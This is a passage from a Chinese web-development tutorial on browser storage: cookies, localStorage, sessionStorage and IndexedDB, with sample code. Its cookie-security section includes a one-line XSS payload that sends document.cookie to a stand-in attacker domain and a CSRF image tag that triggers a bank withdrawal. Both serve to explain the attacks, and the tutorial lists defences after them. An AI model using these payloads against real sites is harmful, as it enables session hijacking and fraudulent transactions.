src=\"%E5%85%B3%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AD%98%E5%82%A8/code.png\" alt=\"code\"><br>查看结果<br><img src=\"%E5%85%B3%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AD%98%E5%82%A8/cookie.png\" alt=\"cookie\"></p>\n<p>从上图中我们可以得出：</p>\n<h5 id=\"Cookie-的作用域\"><a href=\"#Cookie-的作用域\" class=\"headerlink\" title=\"Cookie 的作用域\"></a>Cookie 的作用域</h5><p>Domain 和 Path 标识定义了 Cookie 的作用域：即 Cookie 应该发送给哪些 URL。<br>Domain 标识指定了哪些主机可以接受 Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。如果指定了 Domain，则一般包含子域名。</p>\n<p><strong>Domain 标识指定了哪些域名可以接受 Cookie。如果没有设置 domain，就会自动绑定到执行语句的当前域</strong>。 如果设置为”.google.com”,则所有以”google.com”结尾的域名都可以访问该 Cookie，所以在百度首页上读取不到第三条代码存储 Cookie 值。</p>\n<p>当将域名设置为当前执行语句的域名时，就可以看见该条记录<br><img src=\"%E5%85%B3%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AD%98%E5%82%A8/code.png\" alt=\"code1\"><br>查看结果<br><img src=\"%E5%85%B3%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AD%98%E5%82%A8/cookie.png\" alt=\"cookie1\"></p>\n<h3 id=\"4-Cookie-的缺陷\"><a href=\"#4-Cookie-的缺陷\" class=\"headerlink\" title=\"4.Cookie 的缺陷\"></a>4.Cookie 的缺陷</h3><ul>\n<li><p>Cookie 不够大<br>Cookie 的大小限制在 4KB 左右，对于复杂的存储需求来说是不够用的。当 Cookie 超过 4KB 时，它将面临被裁切的命运。这样看来，Cookie 只能用来存取少量的信息。此外很多浏览器对一个站点的 cookie 个数也是有限制的。<br>这里需注意：各浏览器的 cookie <strong>每一个 name=value 的 value 值大概在 4k</strong>，所以 4k 并不是一个域名下所有的 cookie 共享的,而是一个 name 的大小。</p>\n</li>\n<li><p>过多的 Cookie 会带来巨大的性能浪费<br>Cookie 是紧跟域名的。<strong>同一个域名下的所有请求，都会携带 Cookie</strong>。大家试想，如果我们此刻仅仅是请求一张图片或者一个 CSS 文件，我们也要携带一个 Cookie 跑来跑去（关键是 Cookie 里存储的信息并不需要），这是一件多么劳民伤财的事情。Cookie 虽然小，请求却可以有很多，随着请求的叠加，这样的不必要的 Cookie 带来的开销将是无法想象的。<br>cookie 是用来维护用户信息的，而域名(domain)下所有请求都会携带 cookie，但对于静态文件的请求，携带 cookie 信息根本没有用，此时可以通过 cdn（存储静态文件的）的域名和主站的域名分开来解决。</p>\n</li>\n<li><p>安全问题<br>由于在 HTTP 请求中的 Cookie 是明文传递的，所以安全性成问题，除非用 HTTPS。</p>\n</li>\n</ul>\n<h3 id=\"5-Cookie-与安全\"><a href=\"#5-Cookie-与安全\" class=\"headerlink\" title=\"5.Cookie 与安全\"></a>5.Cookie 与安全</h3><p><strong>tips:</strong> 当机器处于不安全环境时，切记不能通过 HTTP Cookie 存储、传输敏感信息</p>\n<ul>\n<li>会话劫持和跨站脚本攻击（XSS）<br>在 Web 应用中，Cookie 常用来标记用户或授权会话。因此，如果 Web 应用的 Cookie 被窃取，可能导致授权用户的会话受到攻击。常用的窃取 Cookie 的方法有利用社会工程学攻击和利用应用程序漏洞进行 XSS 攻击。</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(new Image()).src = &quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot; + document.cookie;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>跨站请求伪造（CSRF）<br>比如在不安全聊天室或论坛上的一张图片，当你访问这张图片，它实际上是一个给你银行服务器发送提现的请求：<br>当你打开含有了这张图片的 HTML 页面时，如果你之前已经登录了你的银行帐号并且 Cookie 仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=&quot;http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory&quot;&gt;</span><br></pre></td></tr></table></figure>\n\n<p>有一些方法可以阻止此类事件的发生：</p>\n<ul>\n<li>对用户输入进行过滤来阻止 XSS；</li>\n<li>任何敏感操作都需要确认；</li>\n<li>用于敏感信息的 Cookie 只能拥有较短的生命周期；</li>\n</ul>\n<p>为了弥补 Cookie 的局限性，让“专业的人做专业的事情”，Web Storage 出现了。<br><strong>HTML5 中新增了本地存储的解决方案—-Web Storage，它分成两类：sessionStorage 和 localStorage。</strong>这样有了 WebStorage 后，cookie 能只做它应该做的事情了——作为客户端与服务器交互的通道，保持客户端状态。</p>\n<h1 id=\"LocalStorage\"><a href=\"#LocalStorage\" class=\"headerlink\" title=\"LocalStorage\"></a>LocalStorage</h1><h2 id=\"1-LocalStorage-的特点\"><a href=\"#1-LocalStorage-的特点\" class=\"headerlink\" title=\"1.LocalStorage 的特点\"></a>1.LocalStorage 的特点</h2><ul>\n<li>保存的数据长期存在，下一次访问该网站的时候，网页可以直接读取以前保存的数据。</li>\n<li>大小为 5M 左右</li>\n<li>仅在客户端使用，不和服务端进行通信</li>\n<li>接口封装较好</li>\n</ul>\n<h2 id=\"2-存入-读取-删除数据\"><a href=\"#2-存入-读取-删除数据\" class=\"headerlink\" title=\"2.存入/读取/删除数据\"></a>2.存入/读取/删除数据</h2><p>localStorage 保存的数据，以“键值对”的形式存在。也就是说，每一项数据都有一个键名和对应的值。所有的数据都是以文本格式保存。 存入数据使用 setItem 方法。它接受两个参数，第一个是键名，第二个是保存的数据。 localStorage.setItem(“key”,”value”);读取数据使用 getItem 方法。它只有一个参数，就是键名。 var valueLocal=localStorage.getItem(“key”);</p>\n<ul>\n<li>存入数据<br><strong>localStorage.setItem(“key”, “value”)</strong><br>该方法接受一个键名和值作为参数，将会把键值对添加到存储中，如果键名存在，则更新其对应的值。</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">if (window.localStorage) &#123;</span><br><span class=\"line\">  localStorage.setItem(&quot;name&quot;, &quot;hello&quot;);</span><br><span class=\"line\">  localStorage.setItem(&quot;age&quot;, 18);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>读取数据<br><strong>localStorage.getItem(“key”)</strong><br>该方法接受一个键名作为参数，返回键名对应的值<br>只需要传入 key 即可</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var name = localStorage.getItem(&quot;name&quot;);</span><br><span class=\"line\">var age = localStorage.getItem(&quot;age&quot;);</span><br><span class=\"line\">console.log(name) // hello</span><br><span class=\"line\">console.log(age) // 18</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>删除数据<br><strong>localStorage.removeItem(“key”);</strong><br>该方法接受一个键名作为参数，并把该键名从存储中删除。<br>只需要传入 key 即可</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">localStorage.removeItem(&quot;name&quot;);</span><br><span class=\"line\">localStorage.removeItem(&quot;age&quot;);</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>移除所有<br><strong>localStorage.clear();</strong><br>调用该方法会清空存储中的所有键名。<br>不需要传入参数</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">localStorage.clear();</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"3-使用场景\"><a href=\"#3-使用场景\" class=\"headerlink\" title=\"3.使用场景\"></a>3.使用场景</h2><p>LocalStorage 在存储方面没有什么特别的限制，理论上 Cookie 无法胜任的、可以用简单的键值对来存取的数据存储任务，都可以交给 LocalStorage 来做。</p>\n<p>这里给大家举个例子，考虑到 LocalStorage 的特点之一是持久，有时我们更倾向于用它来存储一些内容稳定的资源。比如图片内容丰富的电商网站会用它来存储 Base64 格式的图片字符串：</p>\n<h1 id=\"SessionStorage\"><a href=\"#SessionStorage\" class=\"headerlink\" title=\"SessionStorage\"></a>SessionStorage</h1><p>sessionStorage 保存的数据用于浏览器的一次会话，当会话结束（通常是该窗口关闭），数据被清空；sessionStorage 特别的一点在于，即便是相同域名下的两个页面，只要它们不在同一个浏览器窗口中打开，那么它们的 sessionStorage 内容便无法共享；localStorage 在所有同源窗口中都是共享的；cookie 也是在所有同源窗口中都是共享的。除了保存期限的长短不同，SessionStorage 的属性和方法与 LocalStorage 完全一样。</p>\n<h2 id=\"1-sessionStorage-的特点\"><a href=\"#1-sessionStorage-的特点\" class=\"headerlink\" title=\"1.sessionStorage 的特点\"></a>1.sessionStorage 的特点</h2><ul>\n<li>会话级别的浏览器存储</li>\n<li>大小为 5M 左右</li>\n<li>仅在客户端使用，不和服务端进行通信</li>\n<li>接口封装较好</li>\n</ul>\n<h2 id=\"2-存入-读取-删除数据-1\"><a href=\"#2-存入-读取-删除数据-1\" class=\"headerlink\" title=\"2.存入/读取/删除数据\"></a>2.存入/读取/删除数据</h2><p>sessionStorage 保存的数据，以“键值对”的形式存在。也就是说，每一项数据都有一个键名和对应的值。所有的数据都是以文本格式保存。 存入数据使用 setItem 方法。它接受两个参数，第一个是键名，第二个是保存的数据。 sessionStorage.setItem(“key”,”value”);读取数据使用 getItem 方法。它只有一个参数，就是键名。 var valueLocal=sessionStorage.getItem(“key”);</p>\n<ul>\n<li>存入数据<br><strong>sessionStorage.setItem(“key”, “value”)</strong><br>该方法接受一个键名和值作为参数，将会把键值对添加到存储中，如果键名存在，则更新其对应的值。</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">if (window.sessionStorage) &#123;</span><br><span class=\"line\">  sessionStorage.setItem(&quot;name&quot;, &quot;hello&quot;);</span><br><span class=\"line\">  sessionStorage.setItem(&quot;age&quot;, 18);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>读取数据<br><strong>sessionStorage.getItem(“key”)</strong><br>该方法接受一个键名作为参数，返回键名对应的值<br>只需要传入 key 即可</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var name = sessionStorage.getItem(&quot;name&quot;);</span><br><span class=\"line\">var age = sessionStorage.getItem(&quot;age&quot;);</span><br><span class=\"line\">console.log(name) // hello</span><br><span class=\"line\">console.log(age) // 18</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>删除数据<br><strong>sessionStorage.removeItem(“key”);</strong><br>该方法接受一个键名作为参数，并把该键名从存储中删除。<br>只需要传入 key 即可</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sessionStorage.removeItem(&quot;name&quot;);</span><br><span class=\"line\">sessionStorage.removeItem(&quot;age&quot;);</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>移除所有<br><strong>sessionStorage.clear();</strong><br>调用该方法会清空存储中的所有键名。<br>不需要传入参数</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sessionStorage.clear();</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"3-使用场景-1\"><a href=\"#3-使用场景-1\" class=\"headerlink\" title=\"3.使用场景\"></a>3.使用场景</h2><p>sessionStorage 更适合用来存储生命周期和它同步的会话级别的信息。这些信息只适用于当前会话，当你开启新的会话时，它也需要相应的更新或释放。比如微博的 sessionStorage 就主要是存储你本次会话的浏览足迹</p>\n<h2 id=\"sessionStorage-、localStorage-和-cookie-之间的区别\"><a href=\"#sessionStorage-、localStorage-和-cookie-之间的区别\" class=\"headerlink\" title=\"sessionStorage 、localStorage 和 cookie 之间的区别\"></a><strong>sessionStorage 、localStorage 和 cookie 之间的区别</strong></h2><ul>\n<li>共同点：都是保存在浏览器端，且都遵循同源策略。</li>\n<li>不同点：在于生命周期与作用域的不同</li>\n</ul>\n<p>作用域：localStorage 只要在相同的协议、相同的主机名、相同的端口下，就能读取/修改到同一份 localStorage 数据。sessionStorage 比 localStorage 更严苛一点，除了协议、主机名、端口外，还要求在同一窗口（也就是浏览器的标签页）下</p>\n<p>生命周期：localStorage 是持久化的本地存储，存储在其中的数据是永远不会过期的，使其消失的唯一办法是手动删除；而 sessionStorage 是临时性的本地存储，它是会话级别的存储，当会话结束（页面被关闭）时，存储内容也随之被释放。</p>\n<p>Web Storage 是一个从定义到使用都非常简单的东西。它使用键值对的形式进行存储，这种模式有点类似于对象，却甚至连对象都不是——它只能存储字符串，要想得到对象，我们还需要先对字符串进行一轮解析。</p>\n<p>说到底，Web Storage 是对 Cookie 的拓展，它只能用于存储少量的简单数据。当遇到大规模的、结构复杂的数据时，Web Storage 也爱莫能助了。这时候我们就要清楚我们的终极大 boss——IndexedDB！</p>\n<h1 id=\"IndexDB\"><a href=\"#IndexDB\" class=\"headerlink\" title=\"IndexDB\"></a>IndexDB</h1><p>通俗地说，IndexedDB 就是<strong>浏览器提供的本地数据库</strong>，它可以被网页脚本创建和操作。IndexedDB 允许储存大量数据，提供查找接口，还能建立索引。这些都是 LocalStorage 所不具备的。就数据库类型而言，IndexedDB 不属于关系型数据库（不支持 SQL 查询语句），更接近 NoSQL 数据库。<br>IndexedDB 是一种低级 API，**用于客户端存储大量结构化数据(包括文件和 blobs)**。该 API 使用索引来实现对该数据的高性能搜索。IndexedDB 是一个运行在浏览器上的非关系型数据库。既然是数据库了，那就不是 5M、10M 这样小打小闹级别了。理论上来说，IndexedDB 是没有存储上限的（一般来说不会小于 250M）。它不仅可以存储字符串，还可以存储二进制数据。</p>\n<h2 id=\"1-IndexedDB-的特点\"><a href=\"#1-IndexedDB-的特点\" class=\"headerlink\" title=\"1.IndexedDB 的特点\"></a>1.IndexedDB 的特点</h2><ul>\n<li><p>键值对储存。<br>IndexedDB 内部采用对象仓库（object store）存放数据。所有类型的数据都可以直接存入，包括 JavaScript 对象。对象仓库中，数据以”键值对”的形式保存，每一个数据记录都有对应的主键，主键是独一无二的，不能有重复，否则会抛出一个错误。</p>\n</li>\n<li><p>异步<br>IndexedDB 操作时不会锁死浏览器，用户依然可以进行其他操作，这与 LocalStorage 形成对比，后者的操作是同步的。异步设计是为了防止大量数据的读写，拖慢网页的表现。</p>\n</li>\n<li><p>支持事务。<br>IndexedDB 支持事务（transaction），这意味着一系列操作步骤之中，只要有一步失败，整个事务就都取消，数据库回滚到事务发生之前的状态，不存在只改写一部分数据的情况。</p>\n</li>\n<li><p>同源限制<br>IndexedDB 受到同源限制，每一个数据库对应创建它的域名。网页只能访问自身域名下的数据库，而不能访问跨域的数据库。</p>\n</li>\n<li><p>储存空间大<br>IndexedDB 的储存空间比 LocalStorage 大得多，一般来说不少于 250MB，甚至没有上限。</p>\n</li>\n<li><p>支持二进制储存。<br>IndexedDB 不仅可以储存字符串，还可以储存二进制数据（ArrayBuffer 对象和 Blob 对象）。</p>\n</li>\n</ul>\n<h2 id=\"2-基本概念\"><a href=\"#2-基本概念\" class=\"headerlink\" title=\"2.基本概念\"></a>2.基本概念</h2><p>IndexedDB 是一个比较复杂的 API，涉及不少概念。它把不同的实体，抽象成一个个对象接口。学习这个 API，就是学习它的各种对象接口。</p>\n<ul>\n<li><p>数据库：IDBDatabase 对象<br>数据库是一系列相关数据的容器。每个域名（严格的说，是协议 + 域名 + 端口）都可以新建任意多个数据库。<br>IndexedDB 数据库有版本的概念。同一个时刻，只能有一个版本的数据库存在。如果要修改数据库结构（新增或删除表、索引或者主键），只能通过升级数据库版本完成。</p>\n</li>\n<li><p>对象仓库：IDBObjectStore 对象<br>每个数据库包含若干个对象仓库（object store）。它类似于关系型数据库的表格。</p>\n</li>\n<li><p>数据记录<br>对象仓库保存的是数据记录。每条记录类似于关系型数据库的行，但是只有主键和数据体两部分。主键用来建立默认的索引，必须是不同的，否则会报错。主键可以是数据记录里面的一个属性，也可以指定为一个递增的整数编号。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123; id: 1, text: &#x27;foo&#x27; &#125;</span><br></pre></td></tr></table></figure></li>\n<li><p>索引： IDBIndex 对象<br>为了加速数据的检索，可以在对象仓库里面，为不同的属性建立索引。</p>\n</li>\n<li><p>事务： IDBTransaction 对象<br>数据记录的读写和删改，都要通过事务完成。事务对象提供 error、abort 和 complete 三个事件，用来监听操作结果。</p>\n</li>\n<li><p>操作请求：IDBRequest 对象</p>\n</li>\n<li><p>指针： IDBCursor 对象</p>\n</li>\n<li><p>主键集合：IDBKeyRange 对象</p>\n</li>\n</ul>\n<h2 id=\"3-IndexedDB-的常见操作\"><a href=\"#3-IndexedDB-的常见操作\" class=\"headerlink\" title=\"3.IndexedDB 的常见操作\"></a>3.IndexedDB 的常见操作</h2><p>在 IndexedDB 大部分操作并不是我们常用的调用方法，返回结果的模式，而是请求——响应的模式。<br>建立打开 IndexedDB —- <strong>window.indexedDB.open(“testDB”)</strong></p>\n<p>操作流程：</p>\n<h4 id=\"3-1-打开数据库\"><a href=\"#3-1-打开数据库\" class=\"headerlink\" title=\"3.1.打开数据库\"></a>3.1.打开数据库</h4><p>使用 IndexedDB 的第一步是打开数据库，使用 indexedDB.open()方法。</p>\n<p><strong>window.indexedDB.open(databaseName, version)</strong><br>这个方法接受两个参数，第一个参数是字符串，表示数据库的名字。如果指定的数据库不存在，就会新建数据库。第二个参数是整数，表示数据库的版本。如果省略，打开已有数据库时，默认为当前版本；新建数据库时，默认为 1。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var request = window.indexedDB.open(&quot;testDB&quot;, version);</span><br></pre></td></tr></table></figure>\n\n<p>indexedDB.open()方法返回一个 IDBOpenDBRequest 对象。这个对象通过三种事件 error、success、upgradeneeded，处理打开数据库的操作结果。</p>\n<p><img src=\"%E5%85%B3%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AD%98%E5%82%A8/indexDB.png\" alt=\"indexDB\"></p>\n<p>这条指令并不会返回一个 DB 对象的句柄，我们得到的是一个 <strong>IDBOpenDBRequest 对象</strong>，而我们希望得到的 DB 对象在其 result 属性中</p>\n<p>除了 result，IDBOpenDBRequest 接口定义了几个重要属性:</p>\n<p>onerror: 请求失败的回调函数句柄</p>\n<p>onsuccess:请求成功的回调函数句柄</p>\n<p>onupgradeneeded:请求数据库版本变化句柄</p>\n<ul>\n<li>error 事件表示打开数据库失败。</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">request.onerror = function (event) &#123;</span><br><span class=\"line\">  console.log(&#x27;数据库打开报错&#x27;);</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>success 事件表示成功打开数据库。</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var db;</span><br><span class=\"line\">request.onsuccess = function (event) &#123;</span><br><span class=\"line\">  db = request.result;</span><br><span class=\"line\">  console.log(&#x27;数据库打开成功&#x27;);</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>这时，通过 request 对象的 result 属性拿到数据库对象。</p>\n<ul>\n<li>upgradeneeded 事件</li>\n</ul>\n<p>如果指定的版本号，大于数据库的实际版本号，就会发生数据库升级事件 upgradeneeded。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var db;</span><br><span class=\"line\">request.onupgradeneeded = function (event) &#123;</span><br><span class=\"line\">  db = event.target.result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这时通过事件对象的 target.result 属性，拿到数据库实例。</p>\n<h4 id=\"3-2-新建数据库\"><a href=\"#3-2-新建数据库\" class=\"headerlink\" title=\"3.2.新建数据库\"></a>3.2.新建数据库</h4><p><strong>createObjectStore</strong><br>新建数据库与打开数据库是同一个操作。如果指定的数据库不存在，就会新建。不同之处在于，后续的操作主要在 upgradeneeded 事件的监听函数里面完成，因为这时版本从无到有，所以会触发这个事件。</p>\n<p>通常，新建数据库以后，第一件事是新建对象仓库（即新建表）。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">request.onupgradeneeded = function(event) &#123;</span><br><span class=\"line\">  db = event.target.result;</span><br><span class=\"line\">  var objectStore = db.createObjectStore(&#x27;person&#x27;, &#123; keyPath: &#x27;id&#x27; &#125;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>上面代码中，数据库新建成功以后，新增一张叫做 person 的表格，主键是 id。<br>更好的写法是先判断一下，这张表格是否存在，如果不存在再新建。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">request.onupgradeneeded = function (event) &#123;</span><br><span class=\"line\">  db = event.target.result;</span><br><span class=\"line\">  var objectStore;</span><br><span class=\"line\">  if (!db.objectStoreNames.contains(&#x27;person&#x27;)) &#123;</span><br><span class=\"line\">    objectStore = db.createObjectStore(&#x27;person&#x27;, &#123; keyPath: &#x27;id&#x27; &#125;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>主键（key）是默认建立索引的属性。比如，数据记录是{ id: 1, name: ‘张三’ }，那么 id 属性可以作为主键。主键也可以指定为下一层对象的属性，比如{ foo: { bar: ‘baz’ } }的 foo.bar 也可以指定为主键。</p>\n<p>如果数据记录里面没有合适作为主键的属性，那么可以让 IndexedDB 自动生成主键。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var objectStore = db.createObjectStore(</span><br><span class=\"line\">  &#x27;person&#x27;,</span><br><span class=\"line\">  &#123; autoIncrement: true &#125;</span><br><span class=\"line\">);</span><br></pre></td></tr></table></figure>\n\n<p>上面代码中，指定主键为一个递增的整数。</p>\n<p>新建对象仓库以后，下一步可以新建索引。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">request.onupgradeneeded = function(event) &#123;</span><br><span class=\"line\">  db = event.target.result;</span><br><span class=\"line\">  var objectStore = db.createObjectStore(&#x27;person&#x27;, &#123; keyPath: &#x27;id&#x27; &#125;);</span><br><span class=\"line\">  objectStore.createIndex(&#x27;name&#x27;, &#x27;name&#x27;, &#123; unique: false &#125;);</span><br><span class=\"line\">  objectStore.createIndex(&#x27;email&#x27;, &#x27;email&#x27;, &#123; unique: true &#125;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>上面代码中，**IDBObject.createIndex()**的三个参数分别为索引名称、索引所在的属性、配置对象（说明该属性是否包含重复的值）。</p>\n<h4 id=\"3-3-新增数据\"><a href=\"#3-3-新增数据\" class=\"headerlink\" title=\"3.3.新增数据\"></a>3.3.新增数据</h4><p>新增数据指的是向对象仓库写入数据记录。这需要通过事务完成。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function add() &#123;</span><br><span class=\"line\">  var request = db.transaction([&#x27;person&#x27;], &#x27;readwrite&#x27;)</span><br><span class=\"line\">    .objectStore(&#x27;person&#x27;)</span><br><span class=\"line\">    .add(&#123; id: 1, name: &#x27;张三&#x27;, age: 24, email: &#x27;zhangsan@example.com&#x27; &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">  request.onsuccess = function (event) &#123;</span><br><span class=\"line\">    console.log(&#x27;数据写入成功&#x27;);</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">  request.onerror = function (event) &#123;</span><br><span class=\"line\">    console.log(&#x27;数据写入失败&#x27;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">add();</span><br></pre></td></tr></table></figure>\n\n<p>上面代码中，写入数据需要新建一个事务。新建时必须指定表格名称和操作模式（”只读”或”读写”）。新建事务以后，通过 **IDBTransaction.objectStore(name)**方法，拿到 IDBObjectStore 对象，再通过表格对象的 add()方法，向表格写入一条记录。</p>\n<p>写入操作是一个异步操作，通过监听连接对象的 success 事件和 error 事件，了解是否写入成功。</p>\n<h4 id=\"3-4-读取数据\"><a href=\"#3-4-读取数据\" class=\"headerlink\" title=\"3.4.读取数据\"></a>3.4.读取数据</h4><p>读取数据也是通过事务完成。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function read() &#123;</span><br><span class=\"line\">   var transaction = db.transaction([&#x27;person&#x27;]);</span><br><span class=\"line\">   var objectStore = transaction.objectStore(&#x27;person&#x27;);</span><br><span class=\"line\">   var request = objectStore.get(1);</span><br><span class=\"line\"></span><br><span class=\"line\">   request.onerror = function(event) &#123;</span><br><span class=\"line\">     console.log(&#x27;事务失败&#x27;);</span><br><span class=\"line\">   &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">   request.onsuccess = function( event) &#123;</span><br><span class=\"line\">      if (request.result) &#123;</span><br><span class=\"line\">        console.log(&#x27;Name: &#x27; + request.result.name);</span><br><span class=\"line\">        console.log(&#x27;Age: &#x27; + request.result.age);</span><br><span class=\"line\">        console.log(&#x27;Email: &#x27; + request.result.email);</span><br><span class=\"line\">      &#125; else &#123;</span><br><span class=\"line\">        console.log(&#x27;未获得数据记录&#x27;);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">   &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">read();</span><br></pre></td></tr></table></figure>\n\n<p>上面代码中，**objectStore.get()**方法用于读取数据，参数是主键的值。</p>\n<h4 id=\"3-5-遍历数据\"><a href=\"#3-5-遍历数据\" class=\"headerlink\" title=\"3.5.遍历数据\"></a>3.5.遍历数据</h4><p>遍历数据表格的所有记录，要使用指针对象 